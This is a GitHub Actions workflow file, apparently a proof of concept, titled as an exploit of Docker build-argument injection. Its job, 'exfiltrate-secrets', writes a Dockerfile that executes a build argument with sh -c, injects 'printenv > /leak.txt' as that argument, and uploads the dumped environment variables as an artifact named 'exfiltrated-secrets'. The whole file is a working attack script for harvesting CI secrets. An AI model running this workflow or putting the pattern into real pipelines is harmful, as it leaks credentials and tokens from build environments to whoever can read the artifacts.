name: Exploit Docker ARG Injection

on:
  push:

jobs:
  exfiltrate-secrets:
    runs-on: ubuntu-latest
    env:
      PYTHON_VERSION: 'printenv > /leak.txt'
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Inject command into Dockerfile
        run: |
          echo "FROM alpine" > Dockerfile
          echo "ARG PYTHON_VERSION" >> Dockerfile
          echo 'RUN echo "Running injected command: ${PYTHON_VERSION}" && sh -c "${PYTHON_VERSION}"' >> Dockerfile

      - name: Build malicious Docker image
        run: docker build -t hacked-image --build-arg PYTHON_VERSION="$PYTHON_VERSION" .

      - name: Extract leaked environment variables
        run: docker run --rm hacked-image cat /leak.txt > leak.txt

      - name: Upload leaked secrets
        uses: actions/upload-artifact@v4
        with:
          name: exfiltrated-secrets
          path: leak.txt
